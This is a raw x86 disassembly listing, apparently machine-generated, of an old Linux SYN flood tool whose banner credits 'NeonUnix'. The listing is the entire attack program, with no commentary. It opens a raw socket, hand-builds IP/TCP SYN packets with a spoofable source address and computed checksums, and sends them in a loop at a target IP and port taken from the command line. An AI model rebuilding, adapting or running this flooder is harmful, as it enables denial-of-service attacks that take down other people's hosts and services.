pop ecx
mov ebx, esp
mov eax, esp
and esp, 0xfffffff8
mov edx, ecx
add edx, edx
add edx, edx
add eax, edx
add eax, 4
xor ebp, ebp
push ebp
push ebp
push ebp
mov ebp, esp
push eax
push ebx
push ecx
mov eax, 0x88
mov ebx, 0
int 0x80
mov eax, dword [var_8h]
mov dword [obj.__environ], eax
movzx eax, word [obj.__fpu_control]
push eax
call sym.imp.__setfpucw
add esp, 4
call sym.imp.__libc_init
jmp dword [reloc.__setfpucw]
jmp dword [reloc.__libc_init]
call loc.gcc2_compiled.
ret 0
push ebp
mov ebp, esp
push ebx
mov ebx, obj.force_to_data
cmp dword [obj.force_to_data], 0xffffffff
je 0x8048de0
mov esi, esi
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x8048dd4
mov ebx, dword [var_4h]
mov esp, ebp
pop ebp
ret
call loc.gcc2_compiled._1
ret 0
push ebp
mov ebp, esp
push ebx
mov ebx, obj.__DTOR_END__
cmp dword [obj.__DTOR_END__], 0
je 0x8048770
mov esi, esi
mov eax, dword [ebx]
call eax
add ebx, 4
cmp dword [ebx], 0
jne 0x8048764
mov ebx, dword [var_4h]
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x64
push esi
push ebx
mov ebx, dword [arg_10h]
mov esi, dword [arg_14h]
mov word [var_2h], bx
mov word [var_4h], si
and byte [var_2ch], 0xf0
or byte [var_2ch], 5
and byte [var_2ch], 0xf
or byte [var_2ch], 0x40
mov byte [var_2bh], 0
push 0x28
call sym.imp.htons
add esp, 4
mov eax, eax
mov word [var_2ah], ax
mov ax, word [var_4h]
mov word [var_28h], ax
mov word [var_26h], 0
mov byte [var_24h], 0xff
mov byte [var_23h], 6
mov word [var_22h], 0
mov eax, dword [arg_8h]
mov dword [var_20h], eax
mov eax, dword [arg_ch]
mov dword [var_1ch], eax
mov ax, word [var_4h]
mov word [var_18h], ax
movzx eax, word [var_2h]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov word [var_16h], ax
movzx ecx, word [var_4h]
mov dword [var_14h], ecx
mov dword [var_10h], 0
and byte [var_ch], 0xf0
and byte [var_ch], 0xf
or byte [var_ch], 0x50
and byte [var_bh], 0xfe
or byte [var_bh], 2
and byte [var_bh], 0xfb
and byte [var_bh], 0xf7
and byte [var_bh], 0xef
and byte [var_bh], 0xdf
and byte [var_bh], 0x3f
push 0x200
call sym.imp.htons
add esp, 4
mov eax, eax
mov word [var_ah], ax
mov word [var_8h], 0
mov word [var_6h], 0
mov word [var_60h], 2
mov ax, word [var_18h]
mov word [var_5eh], ax
mov eax, dword [var_1ch]
mov dword [var_5ch], eax
push 0xff
push 3
push 2
call sym.imp.socket
add esp, 0xc
mov eax, eax
mov dword [fildes], eax
cmp dword [fildes], 0
jge 0x8048ba0
push 0x8048ecc
call sym.imp.perror
add esp, 4
push 1
call sym.imp.exit
add esp, 4
lea esi, [esi]
inc word [var_18h]
inc word [var_28h]
inc dword [var_14h]
mov word [var_8h], 0
mov word [var_22h], 0
push 0x14
lea eax, [var_2ch]
push eax
call sym.in_cksum
add esp, 8
mov eax, eax
mov word [var_22h], ax
mov eax, dword [var_20h]
mov dword [var_4ch], eax
mov eax, dword [var_1ch]
mov dword [var_48h], eax
mov byte [var_44h], 0
mov byte [var_43h], 6
push 0x14
call sym.imp.htons
add esp, 4
mov eax, eax
mov word [var_42h], ax
push 0x14
lea eax, [var_4ch]
lea edx, [eax + 0xc]
push edx
lea eax, [var_2ch]
lea edx, [eax + 0x14]
push edx
call sym.imp.bcopy
add esp, 0xc
push 0x20
lea eax, [var_4ch]
push eax
call sym.in_cksum
add esp, 8
mov eax, eax
mov word [var_8h], ax
mov dword [var_64h], 0x10
mov eax, dword [var_64h]
push eax
lea eax, [var_60h]
push eax
push 0
push 0x28
lea eax, [var_2ch]
push eax
mov eax, dword [fildes]
push eax
call sym.imp.sendto
add esp, 0x18
mov eax, dword [fildes]
push eax
call sym.imp.close
add esp, 4
lea esp, [var_6ch]
pop ebx
pop esi
mov esp, ebp
pop ebp
ret
jmp dword [reloc.htons]
jmp dword [reloc.socket]
jmp dword [reloc.perror]
jmp dword [reloc.exit]
push ebp
mov ebp, esp
sub esp, 4
push ebx
xor edx, edx
cmp dword [arg_ch], 1
jg 0x8048c80
jmp 0x8048ca0
jmp 0x8048c80
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax, dword [arg_8h]
movzx ebx, word [eax]
add edx, ebx
add dword [arg_8h], 2
add dword [arg_ch], 0xfffffffe
jmp 0x8048c69
lea esi, [esi]
lea edi, [edi]
cmp dword [arg_ch], 1
jne 0x8048cba
mov word [var_2h], 0
mov eax, dword [arg_8h]
mov bl, byte [eax]
mov byte [var_2h], bl
movzx eax, word [var_2h]
add edx, eax
mov eax, edx
sar eax, 0x10
movzx ebx, dx
lea edx, [ebx + eax]
mov eax, edx
sar eax, 0x10
add edx, eax
mov ecx, edx
not cx
movzx ebx, cx
mov eax, ebx
jmp 0x8048ce0
nop
lea esi, [esi]
mov ebx, dword [var_8h]
mov esp, ebp
pop ebp
ret
jmp dword [reloc.bcopy]
jmp dword [reloc.sendto]
jmp dword [reloc.close]
push ebp
mov ebp, esp
sub esp, 8
push 0
lea eax, [var_8h]
push eax
call sym.imp.gettimeofday
add esp, 8
mov eax, dword [seed]
push eax
call sym.imp.srand
add esp, 4
mov esp, ebp
pop ebp
ret
jmp dword [reloc.gettimeofday]
jmp dword [reloc.srand]
push ebp
mov ebp, esp
sub esp, 0x3c
mov word [var_2eh], 0x50
mov dword [var_34h], 0x3e8
push str.cOckSuck_synflooder_by_NeonUnix_n_n
call sym.imp.printf
add esp, 4
cmp dword [argv], 1
jg 0x80487e0
mov eax, dword [envp]
mov edx, dword [eax]
push edx
push str.syntax:__s_dst_ip_dst_prt_num_pkts___src_ip___n
call sym.imp.printf
add esp, 8
push 0
call sym.imp.exit
jmp dword [reloc.printf]
push ebp
mov ebp, esp
sub esp, 4
mov eax, dword [arg_8h]
push eax
call sym.imp.inet_addr
add esp, 4
mov eax, eax
mov dword [obj.i.14], eax
cmp dword [obj.i.14], 0xffffffff
jne 0x8048d6d
mov eax, dword [arg_8h]
push eax
call sym.imp.gethostbyname
add esp, 4
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
jne 0x8048d50
mov eax, dword [arg_8h]
push eax
push str.cant_find__s__n
push obj._IO_stderr_
call sym.imp.fprintf
add esp, 0xc
push 0
call sym.imp.exit
add esp, 4
lea esi, [esi]
mov eax, dword [var_4h]
mov edx, dword [eax + 0xc]
push edx
push obj.i.14
mov eax, dword [var_4h]
mov edx, dword [eax + 0x10]
mov eax, dword [edx]
push eax
call sym.imp.bcopy
add esp, 0xc
mov eax, dword [obj.i.14]
jmp 0x8048d80
lea esi, [esi]
lea edi, [edi]
mov esp, ebp
pop ebp
ret
jmp dword [reloc.inet_addr]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.fprintf]
jmp dword [reloc.sprintf]
jmp dword [reloc.atexit]
jmp dword [reloc.atoi]
jmp dword [reloc.rand]
